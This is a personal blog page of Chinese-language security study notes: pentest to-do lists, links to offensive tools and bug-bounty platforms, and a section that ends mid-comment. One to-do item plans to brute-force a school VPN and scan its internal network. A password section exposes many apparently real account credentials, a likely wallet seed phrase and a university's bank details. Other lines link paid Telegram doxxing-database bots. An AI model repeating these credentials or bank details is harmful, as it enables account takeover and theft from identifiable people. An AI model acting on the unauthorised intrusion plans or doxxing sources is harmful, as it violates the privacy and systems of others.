<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="备忘录1234567891011121314151617181920212223242526272829303132333435363723.07.031.	论文2.	小迪2020        ✔内网        java审计 先等等	webgoat 案例 4-5个        提权3. 	北山 rce ssrf 6.5 6.7 6.9 6.12 ...直播4.	✔5.27公司内网靶机5.">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2023/07/05/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="备忘录1234567891011121314151617181920212223242526272829303132333435363723.07.031.	论文2.	小迪2020        ✔内网        java审计 先等等	webgoat 案例 4-5个        提权3. 	北山 rce ssrf 6.5 6.7 6.9 6.12 ...直播4.	✔5.27公司内网靶机5.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\1679035199649.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\1679058038752.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\image-20230318103054097.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\1677399625944.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\oauth2.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\oauth2_2.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\implicit_grant.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\implicit_grant.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\oauth_passwd.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\ssl.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\image-20230405144757515.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\image-20230417232216350.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\1688006810775.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\image-20230425105425151.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\image-20230425105542529.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\image-20230425105933648.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\image-20230425140105688.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\image-20230425142341515.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\image-20230425150957148.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\image-20230426134217143.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\image-20230426135610352.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\image-20230426151528707.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\image-20230521202926073.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\1656411333134.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\1665632561044.png">
<meta property="og:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\1656426236040.png">
<meta property="article:published_time" content="2023-07-05T06:46:12.770Z">
<meta property="article:modified_time" content="2023-07-05T06:06:54.732Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="c:\Users\hyy\Desktop\%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.assets\1679035199649.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-安全笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T06:46:12.770Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">23.07.03</span><br><span class="line">1.	论文</span><br><span class="line">2.	小迪2020</span><br><span class="line">        ✔内网</span><br><span class="line">        java审计 先等等	webgoat 案例 4-5个</span><br><span class="line">        提权</span><br><span class="line">3. 	北山 rce ssrf 6.5 6.7 6.9 6.12 ...直播</span><br><span class="line">4.	✔5.27公司内网靶机</span><br><span class="line">5.	jndi注入 fastjson log4j shiro550</span><br><span class="line">6.	shuize</span><br><span class="line">7.	burp靶场</span><br><span class="line">8.	fofa搜索登录点 组合学校vpn爆破 进内网fscan</span><br><span class="line">9.	sql 文件上传 绕安全狗 宝塔</span><br><span class="line">	修改xiasql 每个参数都去测</span><br><span class="line">10. js逆向登录框</span><br><span class="line">11.	虚拟路由</span><br><span class="line">	https://blog.csdn.net/Ruoshuiss/article/details/77917511</span><br><span class="line">12.	外网打点与nday收集</span><br><span class="line">13.	arp欺骗</span><br><span class="line">14.	wifi破解</span><br><span class="line">15.	msf cs联动加入新的条件	目前虚拟机 被控win</span><br><span class="line">	1.✔外网</span><br><span class="line">    2.linux 被控机器 linux制作马(crossc2)</span><br><span class="line">    3.不出网 socks5代理或者别的代理软件</span><br><span class="line">16.	ms08067java审计 ofcms   </span><br><span class="line">17.	国外云主机+域名</span><br><span class="line">18.	小迪2023</span><br><span class="line">19.	dnslog服务器</span><br><span class="line">	需要域名ip才能搭建</span><br><span class="line">	https://www.ngui.cc/el/2484823.html?action=onClick</span><br><span class="line">20.	邮件服务器</span><br><span class="line">21.	github gitlab相关操作</span><br><span class="line">	github.io网页好了 上传的html怎么做</span><br><span class="line">	gitlab	CVE-2023-2478</span><br><span class="line">22.	wiki知识库</span><br><span class="line">23.	信息收集到ip</span><br><span class="line">24.	截取机场流量</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1.科研任务</span><br><span class="line">2.中间件pdf</span><br><span class="line">	vulhub中间件漏洞</span><br><span class="line">3.定期整理书签</span><br><span class="line">	C:\Users\管理员用户名\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks</span><br><span class="line">    从浏览器导入edge书签</span><br><span class="line">4.nmap -p-与指定端口</span><br><span class="line">5.注册表</span><br><span class="line"></span><br><span class="line">收集payload (sql xss)</span><br><span class="line">	收集可能的情形 执行的语句</span><br><span class="line">	waf(安全狗 宝塔)正则怎么匹配 怎么绕过 后端怎么绕过</span><br><span class="line"></span><br><span class="line">信息收集+半自动</span><br><span class="line">	1.暂无开发需求</span><br><span class="line">	2.js-sign逆向</span><br><span class="line">xss</span><br><span class="line">	1.postmessage文章</span><br><span class="line">	2.svg文章</span><br><span class="line">	3.content-type text/html才能触发xss json格式触发不了?????</span><br><span class="line">Oauth2.0 api安全</span><br><span class="line">    1.oauth2.0重定向写csrf</span><br><span class="line">    2.各个开发者平台获取code access_token secret</span><br><span class="line">    3.UnpackMiniApp装到win虚拟机去</span><br><span class="line">    4.spring框架未授权 heapdump</span><br><span class="line">    5.收集各个厂商的ak sk写成正则在HaE apk 小程序中利用</span><br><span class="line"></span><br><span class="line">autorepeater ssrf挖法</span><br></pre></td></tr></table></figure>

<h1 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">kali管理员123其他123456Hyy</span><br><span class="line">非管理员123</span><br><span class="line">centos 小皮面板roottest 123</span><br><span class="line">mysql</span><br><span class="line">	云服务器 	root test	5.7.39</span><br><span class="line">	win			root root	5.5.53</span><br><span class="line">修改密码</span><br><span class="line">    systemctl stop mysqld</span><br><span class="line">    mysqld_safe --skip-grant-tables &amp;</span><br><span class="line">    use mysql;</span><br><span class="line">    UPDATE user SET password=password(&quot;test&quot;) WHERE user=&#x27;root&#x27;; </span><br><span class="line">    MySQL 5.7以上</span><br><span class="line">    update user set authentication_string=passworD(&quot;test&quot;) where user=&#x27;root&#x27;;</span><br><span class="line">    php7 --&gt;https://github.com/skyblueee/sqli-labs-php7.git</span><br><span class="line"></span><br><span class="line">谷歌邮箱密码</span><br><span class="line">hyy30291920@gmai.com</span><br><span class="line">e_4N-Sg_aMQJMU5</span><br><span class="line"></span><br><span class="line">fofa zoomeye</span><br><span class="line">绑定邮箱Fofa123456</span><br><span class="line">绑定手机号和邮箱Zoomeye123</span><br><span class="line"></span><br><span class="line">https://ctf.bugku.com/</span><br><span class="line">jinjidehyy jinjidehyy</span><br><span class="line"></span><br><span class="line">namesilo</span><br><span class="line">huyaoyao Hyy30291920!</span><br><span class="line"></span><br><span class="line">steam</span><br><span class="line">hyyhyyhyy40 hyyhyy123</span><br><span class="line"></span><br><span class="line">数字人民币登录密码</span><br><span class="line">218113Hyy</span><br><span class="line"></span><br><span class="line">CET密码</span><br><span class="line">123456Hyy!</span><br><span class="line"></span><br><span class="line">台式机pin码</span><br><span class="line">123		123Hyy</span><br><span class="line"></span><br><span class="line">microsoft密码</span><br><span class="line">654321Hyy 邮箱登录</span><br><span class="line"></span><br><span class="line">IDEA密码</span><br><span class="line">0921Hyyzhenfeijing</span><br><span class="line"></span><br><span class="line">java账户密码</span><br><span class="line">123456Hyy!</span><br><span class="line"></span><br><span class="line">NVIDIA密码</span><br><span class="line">123456Hyy</span><br><span class="line"></span><br><span class="line">garment library holiday soda shoot exact math feed motor hard wool point</span><br><span class="line"></span><br><span class="line">上海大学研究生招生系统</span><br><span class="line">102801210001696 09218113Hyy</span><br><span class="line"></span><br><span class="line">团员网站密码</span><br><span class="line">218113Hyy</span><br><span class="line"></span><br><span class="line">github</span><br><span class="line">huyaoyao2019 123456789huyaoyao 1228876399@qq.com</span><br><span class="line"></span><br><span class="line">名称：上海大学</span><br><span class="line">税号：1231000042502637XE</span><br><span class="line">地址：上海市延长路149号</span><br><span class="line">电话号码：021-56331221</span><br><span class="line">开户银行：农行上海共和支行</span><br><span class="line">银行账户：03358400801000968</span><br><span class="line"></span><br><span class="line">pin09218113</span><br><span class="line">123456Hyy</span><br><span class="line">笔记本pin 0921</span><br><span class="line"></span><br><span class="line">cloudflare</span><br><span class="line">邮箱		ueR7LswUkDCqmti</span><br><span class="line"></span><br><span class="line">discard</span><br><span class="line">邮箱 		hacktmhyy</span><br><span class="line"></span><br><span class="line">一元机场</span><br><span class="line">邮箱		123456Hyy！</span><br><span class="line"></span><br><span class="line">图鉴平台		http://www.ttshitu.com/user/recharge.html</span><br><span class="line">hyy30291920		tujian123</span><br><span class="line"></span><br><span class="line">http://sso.tidesec.com/</span><br><span class="line">hyy30291920或邮箱	tidesecHyy123</span><br><span class="line"></span><br><span class="line">teamviewer</span><br><span class="line">hyy30291920		hyy3029</span><br><span class="line"></span><br><span class="line">gitee.com</span><br><span class="line">hyy30291920 	giteeHyy123</span><br><span class="line"></span><br><span class="line">https://www.acmcoder.com/#/practice/company			赛马考试平台</span><br><span class="line">saima123！</span><br><span class="line"></span><br><span class="line">#XSS平台</span><br><span class="line">https://xss.yt/index.php/index/User/index.html</span><br><span class="line">hyy30291920</span><br><span class="line">xssyt123</span><br><span class="line"></span><br><span class="line">#CTF</span><br><span class="line">buuoj.cn</span><br><span class="line">buuctf123</span><br><span class="line"></span><br><span class="line">#Goby</span><br><span class="line">hyy19</span><br><span class="line">gobyHyy123!</span><br><span class="line"></span><br><span class="line">#shu邮箱</span><br><span class="line">hyy30291920@shu.edu.cn	123456Hyy</span><br><span class="line"></span><br><span class="line">#Sunny-Ngrok</span><br><span class="line">邮箱 hyy19		Hyy30291920</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1.科研任务</span><br><span class="line">2.中间件pdf</span><br><span class="line">	vulhub中间件漏洞</span><br><span class="line">3.定期整理书签</span><br><span class="line">	C:\Users\管理员用户名\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks</span><br><span class="line">    从浏览器导入edge书签</span><br><span class="line">4.nmap -p-与指定端口</span><br><span class="line">5.注册表</span><br><span class="line"></span><br><span class="line">收集payload (sql xss)</span><br><span class="line">	收集可能的情形 执行的语句</span><br><span class="line">	waf(安全狗 宝塔)正则怎么匹配 怎么绕过 后端怎么绕过</span><br><span class="line"></span><br><span class="line">信息收集+半自动</span><br><span class="line">	1.暂无开发需求</span><br><span class="line">	2.js-sign逆向</span><br><span class="line">xss</span><br><span class="line">	1.postmessage文章</span><br><span class="line">	2.svg文章</span><br><span class="line">	3.content-type text/html才能触发xss json格式触发不了?????</span><br><span class="line">Oauth2.0 api安全</span><br><span class="line">    1.oauth2.0重定向写csrf</span><br><span class="line">    2.各个开发者平台获取code access_token secret</span><br><span class="line">    3.UnpackMiniApp装到win虚拟机去</span><br><span class="line">    4.spring框架未授权 heapdump</span><br><span class="line">    5.收集各个厂商的ak sk写成正则在HaE apk 小程序中利用</span><br><span class="line"></span><br><span class="line">autorepeater ssrf挖法</span><br></pre></td></tr></table></figure>

<h1 id="矢安白嫖"><a href="#矢安白嫖" class="headerlink" title="矢安白嫖"></a>矢安白嫖</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">解码平台</span><br><span class="line">	地址：http://fgmjm.com/#/dashboard</span><br><span class="line">	账号：babamama</span><br><span class="line">	密码：9Un69qUohgegdBetDAa3</span><br><span class="line"></span><br><span class="line">社工库		要钱</span><br><span class="line">	https://t.me/MI6SGK_bot?start=g1pv42TQoI</span><br><span class="line">	https://t.me/zhihu_bot?start=61532049861owusbhttps://t.me/sgkvipbot?start=vip_1064590</span><br><span class="line">	https://t.me/Freeshegongku_bot?start=6153204986ozp5ox</span><br><span class="line">	http://t.me/sgk2023_03_30bot?start=SGK_5AG7IMDK</span><br><span class="line">	https://web.telegram.org/k/#@SGKmainNEWbot</span><br><span class="line">	</span><br><span class="line">工具</span><br><span class="line">	1.https://github.com/shmilylty/OneForAll OneForAll是一款功能强大的子域收集工具</span><br><span class="line">	2.https://github.com/timwhitez/rad-xray 探测子域名</span><br><span class="line">	3.https://github.com/lijiejie/BBScan BBScan 是一个高并发、轻量级的信息泄露扫描工具。</span><br><span class="line"></span><br><span class="line">通用工具</span><br><span class="line">内网扫描 https://github.com/shadow1ng/fscan 2022-07-06</span><br><span class="line">Webshell管理 https://github.com/BeichenDream/Godzilla 2021-11-01</span><br><span class="line">ARL 资产侦察灯塔 https://github.com/TophantTechnology/ARL 2022-08-25</span><br><span class="line">aliyun-accesskey-Tools https://github.com/mrknow001/aliyun-accesskey-Tools 2021-09-28</span><br><span class="line">PEASS-ng 提权套装 https://github.com/carlospolop/PEASS-ng 2022-09-11</span><br><span class="line">nuclei 漏洞扫描器 https://github.com/projectdiscovery/nuclei 2022-08-26</span><br><span class="line">railgun 渗透集成化工具 https://github.com/lz520520/railgun 2022-08-22</span><br><span class="line">YAKIT 网络安全单兵工具 https://github.com/yaklang/yakit 2022-09-16</span><br><span class="line">EHole（棱洞）3.0 指纹探测工具 https://github.com/EdgeSecurityTeam/EHole 2021-06-23</span><br><span class="line">Traitor 提权工具 https://github.com/liamg/traitor 2022-03-09</span><br><span class="line">Stowaway 内网穿透 https://github.com/ph4ntonn/Stowaway 2022-04-08</span><br><span class="line">CF 云环境利用框架 https://github.com/teamssix/cf 2022-09-07</span><br><span class="line">Naabu 端口扫描 https://github.com/projectdiscovery/naabu 2022-07-31</span><br><span class="line">httpx HTTP状态获取 https://github.com/projectdiscovery/httpx 2022-08-01</span><br><span class="line">Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles 2022-09-10</span><br><span class="line">shuize（水泽） 信息收集 https://github.com/0x727/ShuiZe_0x727 2021-08-03</span><br><span class="line">Cloud-Bucket-Leak-Detection-Tools https://github.com/UzJu/Cloud-Bucket-Leak-Detection-Tools 2022-07-16</span><br><span class="line">SharpHostInfo 内网主机探测 https://github.com/shmilylty/SharpHostInfo 2022-09-09</span><br><span class="line">pocsuite3 https://github.com/knownsec/pocsuite3 2022-09-08</span><br><span class="line">URLFinder https://github.com/pingc0y/URLFinder 2022-09-16</span><br><span class="line">ALLiN 扫描工具 https://github.com/P1-Team/AlliN 2022-07-26</span><br><span class="line">ihoneyBakFileScan 备份文件泄露扫描 https://github.com/VMsec/ihoneyBakFileScan_Modify 2022-09-15</span><br><span class="line">spark（火花） 自动字典生成器 https://github.com/G0mini/spark 2022-09-13</span><br><span class="line">Exphub 漏洞利用脚本 https://github.com/zhzyker/exphub 2021-04-04</span><br><span class="line">EasyPen 综合利用工具 https://github.com/lijiejie/EasyPen 2022-09-16</span><br><span class="line"></span><br><span class="line">漏洞利用</span><br><span class="line">SpringBootExploit https://github.com/0x727/SpringBootExploit 2022-04-17</span><br><span class="line">Springboot漏洞全家桶 https://github.com/woodpecker-appstore/springboot-vuldb 2021-05-24</span><br><span class="line">Log4j2Scan https://github.com/whwlsfb/Log4j2Scan 2022-09-02</span><br><span class="line">ShiroExploit https://github.com/feihong-cs/ShiroExploit-Deprecated 2020-10-04</span><br><span class="line">ShiroAttack2 https://github.com/SummerSec/ShiroAttack2 2022-08-31</span><br><span class="line">thinkphp_gui_tools https://github.com/bewhale/thinkphp_gui_tools 2022-08-18</span><br><span class="line">Fastjson-Patrol https://github.com/ce-automne/FastjsonPatrol 2022-04-01</span><br></pre></td></tr></table></figure>
<h1 id="SRC平台"><a href="#SRC平台" class="headerlink" title="SRC平台"></a>SRC平台</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#补天平台</span><br><span class="line">butianHyy19!</span><br><span class="line"></span><br><span class="line">教育行业edu： https://src.sjtu.edu.cn/</span><br><span class="line">cnvd平台： https://www.cnvd.org.cn/</span><br><span class="line"></span><br><span class="line">https://www.vulbox.com/</span><br><span class="line">loudong123</span><br><span class="line"></span><br><span class="line">HackerOne（https://www.hackerone.com/）：全球最大的漏洞赏金平台，拥有超过3000个客户，包括谷歌、微软、PayPal等知名公司。</span><br><span class="line">Bugcrowd（https://www.bugcrowd.com/）：一个全球性的漏洞赏金平台，提供与HackerOne类似的服务，有超过800个客户。</span><br><span class="line">Synack（https://www.synack.com/）：另一个漏洞赏金平台，主要聚焦于企业级安全。</span><br><span class="line">Cobalt（https://cobalt.io/）：提供漏洞赏金服务、渗透测试等安全服务。</span><br><span class="line">Zerocopter（https://zerocopter.com/）：一个漏洞管理平台，将安全测试、漏洞报告、修复等流程整合到一个平台中。</span><br><span class="line">Intigriti（https://www.intigriti.com/）：一个漏洞赏金平台，主要面向欧洲市场。</span><br><span class="line">YesWeHack（https://www.yeswehack.com/）：一个欧洲的漏洞赏金平台，拥有来自全球的安全专家。</span><br><span class="line">FireBounty（https://firebounty.com/）：一个漏洞赏金平台，聚焦于与安全相关的产品和服务，如密码管理器、VPN、防火墙等。</span><br><span class="line">Open Bug Bounty（https://www.openbugbounty.org/）：一个开放式的漏洞报告平台，允许安全研究人员报告漏洞并获得荣誉而非奖金。</span><br></pre></td></tr></table></figure>

<h1 id="北山安全"><a href="#北山安全" class="headerlink" title="北山安全"></a>北山安全</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我是第六期 4.5之前看完第二、第四期 大黄蜂管理员小案例录播</span><br><span class="line">24531跟第六期</span><br></pre></td></tr></table></figure>

<h3 id="2-3-越权"><a href="#2-3-越权" class="headerlink" title="2.3 越权"></a>2.3 越权</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	水平越权 垂直越权</span></span><br><span class="line"><span class="comment">	未授权访问 接口抓出来 